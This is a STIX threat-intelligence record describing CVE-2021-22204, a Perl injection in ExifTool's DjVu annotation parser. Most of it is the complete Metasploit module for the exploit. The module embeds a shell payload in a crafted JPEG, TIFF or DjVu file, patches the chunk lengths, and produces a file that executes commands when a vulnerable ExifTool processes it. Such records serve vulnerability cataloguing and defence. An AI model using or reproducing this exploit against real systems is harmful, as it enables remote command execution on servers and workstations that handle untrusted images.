{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a49a1025-5959-4d8d-abab-9b7eb7d7fbab",
    "created": "2024-08-14T17:14:07.154115Z",
    "modified": "2024-08-14T17:14:07.154118Z",
    "name": "ExifTool DjVu ANT Perl injection",
    "description": " This module exploits a Perl injection vulnerability in the DjVu ANT parsing code of ExifTool versions 7.44 through 12.23 inclusive. The injection is used to execute a shell command using Perl backticks. The DjVu image can be embedded in a wrapper image using the HasselbladExif EXIF field. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/fileformat/exiftool_djvu_ant_perl_injection.rb",
            "external_id": "exiftool_djvu_ant_perl_injection.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ExifTool DjVu ANT Perl injection',\n        'Description' => %q{\n          This module exploits a Perl injection vulnerability in the DjVu ANT\n          parsing code of ExifTool versions 7.44 through 12.23 inclusive. The\n          injection is used to execute a shell command using Perl backticks.\n          The DjVu image can be embedded in a wrapper image using the\n          HasselbladExif EXIF field.\n        },\n        'Author' => [\n          'William Bowling',   # Vulnerability discovery\n          'Justin Steven'      # Metasploit module\n        ],\n        'References' => [\n          %w[CVE 2021-22204],\n          %w[URL https://twitter.com/wcbowling/status/1385803927321415687],\n          %w[URL https://github.com/exiftool/exiftool/commit/cf0f4e7dcd024ca99615bfd1102a841a25dde031],\n          %w[URL https://www.openwall.com/lists/oss-security/2021/05/10/5]\n        ],\n        'DisclosureDate' => '2021-05-24',\n        'License' => MSF_LICENSE,\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Privileged' => false,\n        'Payload' => {\n          'DisableNops' => true,\n          'Space' => 2000,\n          'BadChars' => \"\\x22\\x24\\x40\\x60\\x5c\" # \", $, @, ` and \\\n        },\n        'Targets' => [\n          ['JPEG file', { template: 'msf.jpg' }],\n          ['TIFF file', { template: 'msf.tif' }],\n          ['DjVu file', { template: 'msf.djvu' }]\n        ],\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options([\n      OptString.new('FILENAME', [true, 'Output file', 'msf.jpg'])\n    ])\n  end\n\n  def exploit\n    p = payload.encoded\n\n    buf = djvu_template.sub('echo vulnerable > /dev/tty', p)\n    buf[8, 4] = [209 + p.length].pack('L>')     # Fix up DJVM length\n    buf[174, 4] = [43 + p.length].pack('L>')    # Fix up DJVI length\n    buf[186, 4] = [31 + p.length].pack('L>')    # Fix up ANTa length\n\n    if target.name == 'JPEG file'\n      jpeg_buf = jpeg_template\n      jpeg_buf[86, 2221] = buf + Rex::Text.rand_text_alphanumeric(2221 - buf.length)\n      buf = jpeg_buf\n    elsif target.name == 'TIFF file'\n      tif_buf = tif_template\n      tif_buf[206, 2221] = buf + Rex::Text.rand_text_alphanumeric(2221 - buf.length)\n      buf = tif_buf\n    end\n\n    file_create(buf)\n  end\n\n  def djvu_template\n    File.read(File.join(\n      Msf::Config.data_directory, 'exploits', 'CVE-2021-22204', 'msf.djvu'\n    ))\n  end\n\n  def jpeg_template\n    File.read(File.join(\n      Msf::Config.data_directory, 'exploits', 'CVE-2021-22204', 'msf.jpg'\n    ))\n  end\n\n  def tif_template\n    File.read(File.join(\n      Msf::Config.data_directory, 'exploits', 'CVE-2021-22204', 'msf.tif'\n    ))\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-05-24",
    "x_mitre_platforms": [
        "unix'"
    ]
}